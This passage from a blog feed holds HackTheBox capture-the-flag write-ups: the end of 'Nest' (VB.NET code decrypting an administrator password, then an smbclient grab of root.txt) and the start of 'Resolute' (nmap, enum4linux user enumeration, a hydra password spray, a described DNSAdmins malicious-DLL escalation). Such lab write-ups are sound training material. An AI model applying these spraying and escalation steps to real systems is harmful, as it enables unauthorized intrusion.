class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        saltValueBytes </span>= Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim cipherTextBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        cipherTextBytes </span>= Convert.FromBase64String(cipherText)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim password As New <span class="title">Rfc2898DeriveBytes</span><span class="params">(passPhrase, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                           saltValueBytes, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                           passwordIterations)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        Dim keyBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        keyBytes </span>= password.GetBytes(CInt(keySize / <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line"></span><br><span class="line">        Dim decryptor As ICryptoTransform</span><br><span class="line">        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)</span><br><span class="line"></span><br><span class="line">        Dim memoryStream As IO.MemoryStream</span><br><span class="line">        memoryStream = New IO.MemoryStream(cipherTextBytes)</span><br><span class="line"></span><br><span class="line">        Dim cryptoStream As CryptoStream</span><br><span class="line">        cryptoStream = New CryptoStream(memoryStream, _</span><br><span class="line">                                        decryptor, _</span><br><span class="line">                                        CryptoStreamMode.Read)</span><br><span class="line"></span><br><span class="line">        Dim plainTextBytes As Byte()</span><br><span class="line">        ReDim plainTextBytes(cipherTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        Dim decryptedByteCount As Integer</span><br><span class="line">        decryptedByteCount = cryptoStream.Read(plainTextBytes, _</span><br><span class="line">                                               <span class="number">0</span>, _</span><br><span class="line">                                               plainTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        memoryStream.Close()</span><br><span class="line">        cryptoStream.Close()</span><br><span class="line"></span><br><span class="line">        Dim plainText As <span class="keyword">String</span></span><br><span class="line">        plainText = Encoding.ASCII.GetString(plainTextBytes, _</span><br><span class="line">                                            <span class="number">0</span>, _</span><br><span class="line">                                            decryptedByteCount)</span><br><span class="line"></span><br><span class="line">        Return plainText</span><br><span class="line">    End Function</span><br><span class="line">End Module</span><br></pre></td></tr></table></figure><p>Copy and execute this in <a href="https://dotnetfiddle.net/" target="_blank" rel="noopener">dotnetfiddle</a> and we will get the password :</p><p><img src="/img/nest/admin-decrypted-password.png" alt="HackTheBox-Nest" title="Administrator password"></p><p>Administrator password :    <code>XtH4nkS4Pl4y1nGX</code></p><h3 id="Grabbing-the-root-txt"><a href="#Grabbing-the-root-txt" class="headerlink" title="Grabbing the root.txt"></a>Grabbing the root.txt</h3><p>Sadly we can‚Äôt use this in <code>Evil-WinRM</code> we don‚Äôt have proper shell to get the <code>root.txt</code> just only <code>smbclient</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\c$ -U Administrator</span><br><span class="line">Enter WORKGROUP\Administrator<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; cd Users\Administrator\Desktop\</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                  DR        0  Sun Jan 26 15:20:50 2020</span></span><br><span class="line"><span class="string">  ..                                 DR        0  Sun Jan 26 15:20:50 2020</span></span><br><span class="line"><span class="string">  desktop.ini                       AHS      282  Sun Jan 26 06:02:44 2020</span></span><br><span class="line"><span class="string">  root.txt                            A       32  Tue Aug  6 06:27:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6545433 blocks available</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; get root.txt</span></span><br><span class="line"><span class="string">getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt;</span></span><br></pre></td></tr></table></figure><p>download the <code>root.txt</code> and finally !</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ ls</span><br><span class="line"><span class="string">'Debug Mode Password.txt'</span>   HqkLdap.exe   IT  <span class="string">'Maintenance Alerts.txt'</span>   nmap-Nest   Production   Reports   root.txt   Shared   user.txt  <span class="string">'Welcome Email.txt'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cut -c 4-12 root.txt</span><br><span class="line">c2eb084bc</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="noopener">dotPeek - .NET Decompiler and Assembly </a></p><p><a href="https://dotnetfiddle.net/" target="_blank" rel="noopener">dotnetfiddle</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retired </tag>
            
            <tag> windows </tag>
            
            <tag> smb </tag>
            
            <tag> dotnetfiddle </tag>
            
            <tag> smbclient </tag>
            
            <tag> psexec </tag>
            
            <tag> visual studio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Resolute</title>
      <link href="/2020-05-29/HackTheBox-Resolute/"/>
      <url>/2020-05-29/HackTheBox-Resolute/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/Resolute/htb-Resolute.png" alt="HackTheBox-OpenAdmin" title="RESOLUTE"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Resolute run as medium machine but an easy box‚Äô in the first phase you easily find the <code>users</code> of the box and 1 <code>password</code> by using <code>enum4linux</code>. I run <strong><code>hydra</code></strong> to bruteforce the <code>users</code> using 1 <code>password</code> and easily got right creds with <code>melanie</code>. I use the creds to get with <code>evil-winrm</code> and got the <code>user.txt</code>. The root part was gave me a little bit headache cause‚Äô there was <code>Anti-Virus</code> inside the machine and I always disconnected when I transfer a file like <code>nc.exe</code> or <code>winPEAS.exe</code> for privilege escalation. As my enumeration there was another user <code>ryan</code> which his password is hidden in the directory. Then after I found it‚Äô I switch to <code>ryan</code> from user <code>melanie</code>. When doing enumeration i found that <code>ryan</code> is part of <strong><code>DNSAdmins</code></strong> that I can abuse it by adding malicious <code>DLL</code> in the <code>serverplugin</code>. Using <code>impacket-smbserver</code> i can load my <code>dll</code> file to machine. Restarting the <code>dns</code> service then I will able to execute my <code>dll</code> as administrator.     </p><hr><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí run <code>enum4linux</code> gives some <code>usernames</code> and 1 <code>password</code> which can be use that later</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí with <code>Hydra</code> I brute force all the <code>usernames</code> with only 1 password, the password is right belong to <code>melanie</code></p><p>‚Üí using <code>Evil-WinRM</code> to login as <code>melanie</code> and got the <code>user.txt</code></p></li><li><p><strong>Exploitation</strong></p><p>‚Üí enumerating the file directory there was another user <code>ryan</code></p><p>‚Üí using <code>ls -hidden</code> we see a file which contains juicy information</p><p>‚Üí by reading the <code>.txt</code> file I got the password of <code>ryan</code> then switch user.</p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí create a malicious <code>dll</code> file with <code>msfvenom</code></p><p>‚Üí load my <code>dll</code> file with <code>impacket-smbserver</code></p><p>‚Üí running my meterpreter session</p><p>‚Üí stop and start <code>dns</code> service</p><p>‚Üí finally I got the administrator and <code>root.txt</code></p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-A      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A 10.10.10.169 -oN nmap-Resolute</span><br></pre></td></tr></table></figure><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute</span><br><span class="line">‚ùØ nmap -sV -sC -A -oN nmap-Resolute <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-05-29 06:59 PST</span></span><br><span class="line">WARNING: RST <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> port <span class="number">53</span> -- <span class="keyword">is</span> <span class="keyword">this</span> port really open?</span><br><span class="line">WARNING: RST <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> port <span class="number">53</span> -- <span class="keyword">is</span> <span class="keyword">this</span> port really open?</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.26</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 989 closed ports</span></span><br><span class="line"><span class="function">PORT     STATE SERVICE      VERSION</span></span><br><span class="line"><span class="function">53/tcp   open  domain?</span></span><br><span class="line"><span class="function">| fingerprint-strings: </span></span><br><span class="line"><span class="function">|   DNSVersionBindReqTCP: </span></span><br><span class="line"><span class="function">|     version</span></span><br><span class="line"><span class="function">|_    bind</span></span><br><span class="line"><span class="function">88/tcp   open  kerberos-sec Microsoft Windows <span class="title">Kerberos</span> (<span class="params">server time: <span class="number">2020</span><span class="number">-05</span><span class="number">-30</span> <span class="number">23</span>:<span class="number">11</span>:<span class="number">35</span>Z</span>)</span></span><br><span class="line"><span class="function">135/tcp  open  msrpc        Microsoft Windows RPC</span></span><br><span class="line"><span class="function">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="function">389/tcp  open  ldap         Microsoft Windows Active Directory <span class="title">LDAP</span> (<span class="params">Domain: megabank.local, Site: Default-First-Site-Name</span>)</span></span><br><span class="line"><span class="function">445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-<span class="title">ds</span> (<span class="params">workgroup: MEGABANK</span>)</span></span><br><span class="line"><span class="function">464/tcp  open  kpasswd5?</span></span><br><span class="line"><span class="function">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="function">636/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="function">3268/tcp open  ldap         Microsoft Windows Active Directory <span class="title">LDAP</span> (<span class="params">Domain: megabank.local, Site: Default-First-Site-Name</span>)</span></span><br><span class="line"><span class="function">3269/tcp open  tcpwrapped</span></span><br><span class="line"><span class="function">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class="comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span></span></span><br><span class="line"><span class="function">SF-Port53-TCP:V</span>=<span class="number">7.80</span>%I=<span class="number">7</span>%D=<span class="number">5</span>/<span class="number">31</span>%Time=<span class="number">5</span>ED2E596%P=x86_64-pc-linux-gnu%r(DNSV</span><br><span class="line">SF:ersionBindReqTCP,<span class="number">20</span>,<span class="string">"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03"</span>);</span><br><span class="line"><span class="function">No exact OS matches <span class="keyword">for</span> <span class="title">host</span> (<span class="params">If you know what OS <span class="keyword">is</span> running <span class="keyword">on</span> it, see https://nmap.org/submit/ </span>).</span></span><br><span class="line"><span class="function">TCP/IP fingerprint:</span></span><br><span class="line"><span class="function">OS:<span class="title">SCAN</span>(<span class="params">V=<span class="number">7.80</span>%E=<span class="number">4</span>%D=<span class="number">5</span>/<span class="number">31</span>%OT=<span class="number">53</span>%CT=<span class="number">1</span>%CU=<span class="number">35791</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">5</span>ED2E64</span></span></span><br><span class="line"><span class="function"><span class="params">OS:<span class="number">6</span>%P=x86_64-pc-linux-gnu</span>)<span class="title">SEQ</span>(<span class="params">SP=F9%GCD=<span class="number">4</span>%ISR=<span class="number">109</span>%TI=RD%CI=I%II=I%TS=<span class="number">8</span></span>)SEQ</span></span><br><span class="line"><span class="function">OS:(<span class="params">SP=<span class="number">102</span>%GCD=<span class="number">1</span>%ISR=<span class="number">104</span>%TI=I%CI=I%II=I%SS=O%TS=A</span>)<span class="title">OPS</span>(<span class="params">O1=%O2=%O3=M54DNW8NNT</span></span></span><br><span class="line"><span class="function"><span class="params">OS:<span class="number">11</span>%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11</span>)<span class="title">WIN</span>(<span class="params">W1=<span class="number">0</span>%W2=<span class="number">0</span>%W3=<span class="number">2000</span>%W4=<span class="number">20</span></span></span></span><br><span class="line"><span class="function"><span class="params">OS:<span class="number">00</span>%W5=<span class="number">2000</span>%W6=<span class="number">2000</span></span>)<span class="title">ECN</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">2000</span>%O=M54DNW8NNS%CC=Y%Q=</span>)<span class="title">T1</span>(<span class="params">R=Y%</span></span></span><br><span class="line"><span class="function"><span class="params">OS:DF=Y%T=<span class="number">80</span>%S=Z%A=S+%F=AR%RD=<span class="number">0</span>%Q=</span>)<span class="title">T2</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=S%F=AR%O=%RD=</span></span></span><br><span class="line"><span class="function"><span class="params">OS:<span class="number">0</span>%Q=</span>)<span class="title">T3</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=O%F=AR%O=%RD=<span class="number">0</span>%Q=</span>)<span class="title">T4</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S</span></span></span><br><span class="line"><span class="function"><span class="params">OS:=A%A=O%F=R%O=%RD=<span class="number">0</span>%Q=</span>)<span class="title">T5</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=</span>)<span class="title">T6</span>(<span class="params">R</span></span></span><br><span class="line"><span class="function"><span class="params">OS:=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=A%A=O%F=R%O=%RD=<span class="number">0</span>%Q=</span>)<span class="title">T7</span>(<span class="params">R=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=S+%F=</span></span></span><br><span class="line"><span class="function"><span class="params">OS:AR%O=%RD=<span class="number">0</span>%Q=</span>)<span class="title">U1</span>(<span class="params">R=Y%DF=N%T=<span class="number">80</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%</span></span></span><br><span class="line"><span class="function"><span class="params">OS:RUD=G</span>)<span class="title">IE</span>(<span class="params">R=Y%DFI=N%T=<span class="number">80</span>%CD=Z</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Network Distance: 2 hops</span></span><br><span class="line"><span class="function">Service Info: Host: RESOLUTE</span>; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: <span class="number">2</span>h31m01s, deviation: <span class="number">4</span>h02m30s, median: <span class="number">11</span>m00s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server <span class="number">2016</span> Standard <span class="number">14393</span> (Windows Server <span class="number">2016</span> Standard <span class="number">6.3</span>)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|   Forest name: megabank.local</span><br><span class="line">|   FQDN: Resolute.megabank.local</span><br><span class="line">|_  System time: <span class="number">2020</span><span class="number">-05</span><span class="number">-30</span>T16:<span class="number">12</span>:<span class="number">18</span><span class="number">-07</span>:<span class="number">00</span></span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: <span class="number">2020</span><span class="number">-05</span><span class="number">-30</span>T23:<span class="number">12</span>:<span class="number">22</span></span><br><span class="line">|_  start_date: <span class="number">2020</span><span class="number">-05</span><span class="number">-30</span>T22:<span class="number">15</span>:<span class="number">46</span></span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port <span class="number">80</span>/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">210.01</span> ms <span class="number">10.10</span><span class="number">.14</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">217.91</span> ms <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line"><span class="meta"># Nmap done at Sun May 31 07:03:34 2020 -- 1 IP address (1 host up) scanned in 216.34 seconds</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute took <span class="number">2</span>m8s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><p>We‚Äôve got a lot of open ports. but the interesting was the port :</p><p><code>445(smb)</code>, <code>53(dns)</code>, <code>88(kerberos)</code> and <code>5985(WinRM)</code>.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><p>to enumerate some juicy information to box, i use <code>enum4linux</code> so let‚Äôs see :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">‚ùØ enum4linux -o -U -G -S 10.10.10.169</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 31 08:06:03 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.169</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">''</span></span><br><span class="line">Password ......... <span class="string">''</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.10.169    |</span><br><span class="line"> ====================================================</span><br></pre></td></tr></table></figure><p>As you can see here there‚Äôs a lot of users but only 1 password <code>Welcome123!</code> and it use to user <code>marko</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"> ============================= </span><br><span class="line">|    Users on 10.10.10.169    |</span><br><span class="line"> ============================= </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 866.</span><br><span class="line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span><br><span class="line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span><br><span class="line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password <span class="built_in">set</span> to Welcome123!</span><br><span class="line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)</span><br><span class="line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]+  Stopped                 enum4linux -o -U -G -S 10.10.10.169</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute took 2m4s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>as you can see in this line there was a lot of username but only 1 password that belong to <code>marko</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">index: <span class="number">0x10a9</span> RID: <span class="number">0x457</span> acb: <span class="number">0x00000210</span> Account: marko Name: Marko Novak       Desc: Account created. Password <span class="keyword">set</span> to Welcome123!</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h3><p>I login it with <code>evil-winrm</code> but it failed ! so, i decided to use <code>hydra</code> and save all the usernames on a text file and bruteforce it with only 1 password :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">‚ùØ hydra -t <span class="number">1</span> -V -f -L users.txt -p <span class="string">"Welcome123!"</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> smb</span><br><span class="line">Hydra v9<span class="number">.0</span> (c) <span class="number">2019</span> <span class="keyword">by</span> van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:<span class="comment">//github.com/vanhauser-thc/thc-hydra) starting at 2020-05-31 08:09:55</span></span><br><span class="line">[<span class="meta">DATA</span>] max <span class="number">1</span> task per <span class="number">1</span> server, overall <span class="number">1</span> task, <span class="number">24</span> <span class="function">login <span class="title">tries</span> (<span class="params">l:<span class="number">24</span>/p:<span class="number">1</span></span>), ~24 tries per task</span></span><br><span class="line"><span class="function">[DATA] attacking smb:<span class="comment">//10.10.10.169:445/</span></span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "abigail" - pass "Welcome123!" - 1 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "angela" - pass "Welcome123!" - 2 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "annette" - pass "Welcome123!" - 3 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "annika" - pass "Welcome123!" - 4 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "claire" - pass "Welcome123!" - 5 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "claude" - pass "Welcome123!" - 6 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "felicia" - pass "Welcome123!" - 7 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "fred" - pass "Welcome123!" - 8 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "gustavo" - pass "Welcome123!" - 9 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "Guest" - pass "Welcome123!" - 10 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "marcus" - pass "Welcome123!" - 11 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "marko" - pass "Welcome123!" - 12 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[ATTEMPT] target 10.10.10.169 - login "melanie" - pass "Welcome123!" - 13 of 24 [child 0] (<span class="params"><span class="number">0</span>/<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!</span></span><br><span class="line"><span class="function">[STATUS] attack finished <span class="keyword">for</span> 10.10.10.169 (<span class="params">valid pair found</span>)</span></span><br><span class="line"><span class="function">1 of 1 target successfully completed, 1 valid password found</span></span><br><span class="line"><span class="function"><span class="title">Hydra</span> (<span class="params">https://github.com/vanhauser-thc/thc-hydra</span>) finished at 2020-05-31 08:10:04</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Resolute took 8s </span></span><br><span class="line"><span 